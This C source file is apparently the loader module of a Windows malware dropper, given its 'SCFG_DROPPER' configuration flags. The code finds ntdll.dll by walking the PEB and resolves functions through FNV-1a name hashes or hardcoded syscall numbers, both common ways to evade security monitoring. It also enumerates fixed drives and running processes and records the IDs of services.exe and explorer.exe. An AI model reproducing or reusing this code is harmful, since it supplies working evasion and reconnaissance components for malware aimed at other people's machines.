#include <ldr.h>
#include <config.h>
#include <fnv1a.h>
#include <ntapi.h>
#include "ntapi\ntapi.h"

HMODULE
DECLSPEC_NOINLINE
LdrGetModule(
    IN PWSTR szModuleName,
    IN SIZE_T cbModuleName
    )
{
    PPEB Peb = RtlpGetPeb();
    PLDR_DATA_TABLE_ENTRY Index = (PVOID)((PPEB_LDR_DATA)Peb->Ldr)->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY End = Index;

    do {
        if (Index->BaseDllName.Length == cbModuleName) {
            if (RtlpCompareUnicodeNZ(Index->BaseDllName.Buffer, szModuleName, cbModuleName)) {
                return (HMODULE)Index->DllBase;
            }
        }

        Index = (PVOID)Index->InLoadOrderLinks.Flink;
    } while (Index != End);

    return NULL;
}

ULONG
DECLSPEC_NOINLINE
LdrGetProcAddressEx(
    IN  HMODULE hModule,
    IN  ULONG   dwProcCount,
    IN  PDWORD  dwNameSumsList,
    OUT PVOID   ProcessList
    )
{
    PIMAGE_OPTIONAL_HEADER  OptionalHeader  = (PIMAGE_OPTIONAL_HEADER )((ULONG_PTR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof(ULONG) + IMAGE_SIZEOF_FILE_HEADER);
    PIMAGE_DATA_DIRECTORY   DataDirectory   = (PIMAGE_DATA_DIRECTORY  )(&OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)hModule + DataDirectory->VirtualAddress);

    ULONG     dwProcFound  = 0;
    ULONG_PTR dwExportBase = (ULONG_PTR)ExportDirectory;
    ULONG_PTR dwExportEnd  = (ULONG_PTR)ExportDirectory + DataDirectory->Size;
    PULONG    dwFunctions  = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfFunctions);
    PULONG    dwNames      = (PULONG )((ULONG_PTR)hModule + ExportDirectory->AddressOfNames);
    PUSHORT   nOrdinals    = (PUSHORT)((ULONG_PTR)hModule + ExportDirectory->AddressOfNameOrdinals);

    for (ULONG i = 0; i != ExportDirectory->NumberOfNames && dwProcFound != dwProcCount; i++) {
        ULONG_PTR dwFunctionAddress = (ULONG_PTR)hModule + dwFunctions[nOrdinals[i]];

        if (dwFunctionAddress < dwExportBase && dwFunctionAddress > dwExportEnd) {
            continue;
        }

        DWORD dwFunctionSum = Fnv1AHashStringA((PSTR)((ULONG_PTR)hModule + dwNames[i]));

        for (ULONG y = 0; y != dwProcCount; y++) {
            if (dwFunctionSum == dwNameSumsList[y]) {
                #if SCFG_DROPPER_LDR_PRINT_FOUND_PROC == ON
                    $DLOG1(DLG_FLT_DEFAULT, "%p %08lX %s", dwFunctionAddress, dwFunctionSum, (PSTR)((ULONG_PTR)hModule + dwNames[i]));
                #endif

                ((PULONG_PTR)ProcessList)[y] = dwFunctionAddress;
                dwProcFound++;
        
                break;
            }
        }
    }

    return dwProcFound;
}

BOOL
LdrLoadNtapi(VOID)
{
    enum {
        cbNtdllDll = 18,
    };

    $DLOG1(DLG_FLT_INFO, "Loading NTAPI");

#if SCFG_DROPPER_NTAPI_INIT_USE_SYSCALLS == ON
    if (FALSE) {
#elif SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    if (TRUE) {
#else
    if (Config.NtVersion.bIsDeprecated) {
#endif
        HMODULE hModule;

        if (IS_NULL(hModule = LdrGetModule(L"ntdll.dll", cbNtdllDll))) {
            /* For future versions, you never know */
            if (IS_NULL(hModule = LdrGetModule(L"NTDLL.DLL", cbNtdllDll))) {
                $DLOG1(DLG_FLT_CRITICAL, "Failed to find ntdll.dll");

                return FALSE;
            }
        }

        $DLOG3(DLG_FLT_DEFAULT, "ntdll.dll = 0x%p", hModule);

        ULONG dwFunctionsImported = LdrGetProcAddressEx(
            hModule,
            NtapiSyscallsFunctionsCount,
            NtapiSyscallsNamesHash,
            NtapiSyscallsAddressStorage
            );

        if (dwFunctionsImported != NtapiSyscallsFunctionsCount) {
            $DLOG1(DLG_FLT_CRITICAL, "Imported %lu from %lu", dwFunctionsImported, NtapiSyscallsFunctionsCount);

            return FALSE;
        }
    } else {
        PULONG32_PTR dwSyscallOffset = (PULONG32_PTR)&NtapiSyscallsOffset + Config.NtVersion.dwCommonIndex * NtapiSyscallsFunctionsCount;

        PRAGMA_LOOP_UNROLL_N(16)
        for (ULONG_PTR i = 0; i != NtapiSyscallsFunctionsCount; i++) {
            #if SCFG_DROPPER_LDR_PRINT_SYSCALLS == ON
                $DLOG1(DLG_FLT_DEFAULT, "0x%p = % 5lX", &NtapiSyscallsAddressStorage[i], (PVOID)dwSyscallOffset[i]);
            #endif

            NtapiSyscallsAddressStorage[i] = (PVOID)dwSyscallOffset[i];
        }
    }

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}

BOOL
LdrQueryAllFixedVolumesBitmask(
    OUT PDWORD dwVolumes
    )
{
    $DLOG1(DLG_FLT_INFO, "Querying all fixed volumes");

    /* not sure why */
    #ifdef _AMD64_
        PROCESS_DEVICEMAP_INFORMATION_EX DeviceMap;
    #else
        PROCESS_DEVICEMAP_INFORMATION DeviceMap;
    #endif

    ULONG dwWantedSize = 0;
    NTSTATUS Status;
    RtlpZeroObjectInline(DeviceMap);

    if (NT_ERROR(Status = NtQueryInformationProcess(NtCurrentProcess(), ProcessDeviceMap, &DeviceMap, sizeof(DeviceMap), &dwWantedSize)) || dwWantedSize != sizeof(DeviceMap)) {
        $DLOG1(DLG_FLT_CRITICAL, "ProcessDeviceMap failed %08lX", Status);

        return FALSE;
    }

    DWORD dwFixedMask = 0;
    DWORD dwIndex = 1;

    for (ULONG_PTR i = 0; i != 26; i++) {
        if (DeviceMap.Query.DriveType[i] == DRIVE_FIXED) {
            dwFixedMask ^= dwIndex;

            $DLOG3(DLG_FLT_DEFAULT, "\\??\\%c", 'A' + i);
        }

        dwIndex <<= 1;
    }

    *dwVolumes = DeviceMap.Query.DriveMap & dwFixedMask;

    $DLOG2(DLG_FLT_INFO, "Done");

     return TRUE;
}

BOOL
LdrQueryAllProcesses(
    OUT PSYSTEM_PROCESS_INFORMATION* ProcessesList
    )
{
    $DLOG1(DLG_FLT_INFO, "Querying all processes");

    SIZE_T cbBlock = 0;
    PVOID Block = NULL;

    NtQuerySystemInformation(SystemProcessInformation, NULL, 0, (PVOID)&cbBlock);

    if (!cbBlock) { // This should never fail
        $DLOG1(DLG_FLT_CRITICAL, "SystemProcessInformation expects 0 bytes buffer");

        return FALSE;
    }

    if (NT_ERROR(NtAllocateVirtualMemory(NtCurrentProcess(), &Block, 0, &cbBlock, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        $DLOG1(DLG_FLT_CRITICAL, "Can't allocate %lu bytes", cbBlock);

        return FALSE;
    }

    if (NT_ERROR(NtQuerySystemInformation(SystemProcessInformation, Block, cbBlock, (PVOID)&cbBlock))) {
        $DLOG1(DLG_FLT_CRITICAL, "NtQuerySystemInformation failed");

        return FALSE;
    }

    *ProcessesList = Block;

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}

BOOL
LdrCreateOptimalProcessFilter(
    IN  PSYSTEM_PROCESS_INFORMATION ProcessesList,
    OUT PPROCESSESFILTER Filter
    )
{
    enum {
        cbExplorer = 24,
        cbServices = 24
    };

    $DLOG1(DLG_FLT_INFO, "Gathering infromation for optimal filter");

    ULONG dwFound = 0;

    for (PSYSTEM_PROCESS_INFORMATION Index = ProcessesList; Index->NextEntryOffset; Index = (PVOID)((ULONG_PTR)Index + Index->NextEntryOffset)) {
        if (!Index->ImageName.Length){
            continue;
        }

        if (RtlpCompareUnicodeNZ(Index->ImageName.Buffer, L"services.exe", cbServices)) {
            Filter->ServicePid = Index->UniqueProcessId;

            if (++dwFound == 2) {
                break;
            }
        } else if (RtlpCompareUnicodeNZ(Index->ImageName.Buffer, L"explorer.exe", cbExplorer)) {
            Filter->ExplorerPid = Index->UniqueProcessId;
            Filter->qwExplorerStartTime = Index->CreateTime.QuadPart;

            if (++dwFound == 2) {
                break;
            }
        }
    }

    if (dwFound == 2) {
        $DLOG2(DLG_FLT_DEFAULT, "Services PID : %p",     Filter->ServicePid);
        $DLOG2(DLG_FLT_DEFAULT, "Explorer PID : %p",     Filter->ExplorerPid);
        $DLOG2(DLG_FLT_DEFAULT, "Explorer Time: %I64lu", Filter->qwExplorerStartTime);
        $DLOG2(DLG_FLT_INFO,    "Done");
    } else {
        $DLOG1(DLG_FLT_CRITICAL, "Failed");
    }

    return (dwFound == 2);
}
